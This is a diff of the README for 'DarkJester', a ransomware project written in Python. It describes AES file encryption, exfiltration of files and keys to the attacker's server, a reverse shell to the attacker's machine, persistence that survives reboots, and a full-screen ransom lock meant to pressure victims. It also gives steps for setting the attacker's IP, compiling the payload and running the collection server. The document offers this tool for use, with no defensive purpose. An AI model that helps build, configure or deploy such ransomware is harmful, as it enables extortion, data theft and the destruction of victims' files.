@@ -1,4 +1,4 @@
-# DarkJester: Ransomware
+# DarkJester: A Powerful and Fully Python-based Advanced Ransomware
 
 ![GIF](https://github.com/Kuraiyume/DarkJester/blob/main/Art.gif)
 
@@ -6,13 +6,16 @@
 
 ## Features
 
-- **AES-256 Encryption**: Utilizes AES-256 in CBC (Cipher Block Chaining) mode for robust symmetric encryption.
-- **File Exfiltration**: Before encryption, victim files will be delivered through the server in original format.
-- **Key and System Exfiltration**: Captures the decryption key along with detailed system information, such as OS, processor, architecture, and MAC address, and sends it to a server running.
-- **Multithreaded Encryption/Decryption**: The encryption and decryption processes are multithreaded for optimal performance and efficiency. The number of threads is adjustable.
-- **Command and Control (C2)**: After encryption and exfiltration, DarkJester establishes a reverse shell that connects back to the attacker’s machine. This allows the attacker to remotely access the victim’s device and send ransom notes and decryption scripts if the ransom is paid.
-- **Persistence Mechanism**: DarkJester adds itself to the Windows registry/Daemon in Linux to ensure it persists through reboots, keeping the reverse shell active even if the victim shuts down the machine.
-- **Kiosk Mode (Ransom Note Display)**: DarkJester now features an advanced Kiosk Mode functionality that activates immediately after the encryption process is complete. In this state, the compromised Windows system is locked into a fullscreen environment where normal user interaction is restricted. A persistent ransom note is displayed on-screen, along with a secure input field for entering the decryption key. This immersive mode ensures the victim’s attention is fully directed toward the ransom message, enhancing the psychological pressure often associated with ransomware attacks. Note: This feature is currently supported on Windows operating systems only.
+| Feature                          | Description |
+|----------------------------------|-------------|
+| **AES-256 Encryption**           | Utilizes AES-256 in CBC (Cipher Block Chaining) mode for robust symmetric encryption. |
+| **File Exfiltration**           | Before encryption, victim files will be delivered through the server in original format. |
+| **Key and System Exfiltration** | Captures the decryption key along with detailed system information, such as OS, processor, architecture, and MAC address, and sends it to a server running. |
+| **Multithreaded Encryption/Decryption** | The encryption and decryption processes are multithreaded for optimal performance and efficiency. The number of threads is adjustable. |
+| **Command and Control (C2)**    | After encryption and exfiltration, DarkJester establishes a reverse shell that connects back to the attacker’s machine. This allows the attacker to remotely access the victim’s device and send ransom notes and decryption scripts if the ransom is paid. |
+| **Persistence Mechanism**       | DarkJester adds itself to the Windows registry/Daemon in Linux to ensure it persists through reboots, keeping the reverse shell active even if the victim shuts down the machine. |
+| **Kiosk Mode (Ransom Note Display)** | Activates after encryption is complete. Locks the Windows system into fullscreen mode displaying a persistent ransom note and input field for the decryption key. Enhances psychological pressure. Currently supported on Windows only. |
+
 
 ## Installation and Setup
 
@@ -28,7 +31,7 @@
     - Modify the **IP address** of the reverse shell to the attacker's IP.
     - Modify the **server IP** where the system information and decryption key will be sent.
 
-3. **Compile the payload** into an executable file:
+3. **Compile the payload** into an executable file (Optional):
     - Modify the `.spec` file to adjust any customizations if necessary.
     - Compile the `.spec` file using PyInstaller:
       ```bash
@@ -49,7 +52,7 @@
 
 ### **Attacker Side**
 
-1. **Install Dependencies** or just the **Flask**:
+1. **Install Dependencies**:
     - Install all the dependencies or just the Flask library:
       ```bash
       pip3 install -r requirements.txt
@@ -69,13 +72,13 @@
 After both the attacker and victim sides are set up, you can proceed with the following:
 
 1. **Victim Executes Payload**:
-    - Once the victim runs the `raw` or `executable` payload, it will encrypt files, exfiltrate data, and establish a reverse shell connection.
+    - When the victim executes the `raw` or `compiled` payload, it will initiate file encryption, extract sensitive data, connect to the command-and-control (C2) server, and activate kiosk mode on the system.
 
 2. **Attacker Monitors Connection**:
-    - The attacker should monitor the Flask serve and NetCat listener for incoming system information and the reverse shell connection.
+    - The attacker should monitor the server for incoming system information and the C2 connection.
 
-3. **Ransom Communication**:
-    - The attacker can communicate with the victim through the reverse shell, sending ransom notes or decryption instructions.
+3. **Device Communication**:
+    - The attacker can communicate with the victim's device through C2.
 
 ## Licence
 
